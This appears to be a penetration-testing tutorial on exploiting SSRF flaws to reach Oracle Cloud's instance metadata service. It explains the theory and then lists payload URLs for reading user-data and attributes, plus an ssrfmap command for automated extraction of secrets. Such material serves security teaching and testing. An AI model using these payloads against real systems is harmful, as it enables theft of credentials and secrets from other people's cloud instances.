---
title: 'Oracle Cloud SSRF Vulnerabilities: Exploitation Guide'
description: Explore exploitation of Oracle Cloud's metadata service via SSRF vulnerabilities
  to extract sensitive data.
keywords:
- Oracle Cloud
- SSRF vulnerabilities
- metadata service
- data extraction
- instance metadata
- user-data
- security
- cloud exploitation
---

# Oracle Cloud

## Context

This article aims to demonstrate the exploitation of Oracle Cloud's instance metadata service using Server-Side Request Forgery (SSRF) techniques to extract sensitive information. It assumes you have a foundational understanding of the HTTP protocol, cloud service architectures, and general metadata service exploitation methods via SSRF.

## Theory

### Oracle Cloud Instance Metadata Service (IMDS)

The Oracle Cloud Instance Metadata Service (IMDS) is a local HTTP endpoint located at `http://192.0.0.192`. It provides instance-specific metadata to Oracle Cloud compute instances. This service is only accessible from within the instance's network and is not exposed externally, making it a prime target for exploitation through SSRF vulnerabilities in web applications. If an application has an SSRF vulnerability, it can be manipulated to communicate with the IMDS endpoint, potentially accessing sensitive metadata.

### Metadata Endpoint Structure and Sensitive Data

The Oracle Cloud IMDS endpoint structure is designed to return instance metadata, which can include vital credentials and configuration settings. The metadata could contain the following sensitive components:

- **user-data**: This is custom data that can be provided when the instance is launched. It often includes secrets or specific configuration details.

- **attributes**: These are key-value pairs that provide instance-specific information. This data can sometimes include sensitive tokens or other confidential information.

Understanding the data flow involving these endpoints helps identify the critical areas where data extraction can occur if vulnerabilities are present.

### Attacker Goals and Threat Surface

By exploiting SSRF vulnerabilities, attackers aim to query the IMDS, enumerate available endpoints, and extract sensitive data from them. The threat model assumes that applications tend to trust internal network requests. Therefore, if an SSRF vulnerability is present, it creates an opportunity to reach the IMDS, facilitating unauthorized access to the instance's metadata.

## Practice

### Enumerate Oracle Cloud IMDS via SSRF

In this section, we explore how to manually enumerate the Oracle Cloud IMDS by leveraging SSRF vulnerabilities.

- **Initial Probe**:
  
  ```http
  http://192.0.0.192/latest/meta-data/
  ```
  This initial request confirms access to the instance metadata service through an SSRF vulnerability.

- **Retrieve User-Data**:
  
  ```http
  http://192.0.0.192/latest/user-data
  ```
  Attempt to access `user-data`, which may contain secrets or configurations provided during the instance launch.

- **List Attributes**:
  
  ```http
  http://192.0.0.192/latest/attributes/
  ```
  Query this endpoint to list available attributes for further targeted extraction.

- **Extract Specific Attribute Values**:
  
  ```http
  http://192.0.0.192/latest/attributes/<attribute_name>
  ```
  Replace `<attribute_name>` with the keys discovered earlier to extract their values.

Using these payloads, one can gain access to sensitive data such as credentials, configuration settings, and other secrets stored within the instance metadata.

### Automated Metadata Extraction Using SSRF Exploitation Tools

For more efficient exploitation, you can use automated tools like SSRFMap to facilitate metadata extraction.

- **Automated SSRF Exploitation**:

  ```bash
  ssrfmap -r request.txt -p url -m oracle -o output.txt
  ```
  
  This command automates the process of sending SSRF payloads and extracting metadata by targeting Oracle's IMDS. The results are saved in `output.txt`.

## Tools

- **ssrfmap**
- **curl** 

By following the approaches outlined above, you can effectively exploit SSRF vulnerabilities to access Oracle Cloud's instance metadata, gaining potentially sensitive insights into the cloud environment. Ensure to conduct these activities within legal and ethical boundaries, respecting all relevant laws and regulations.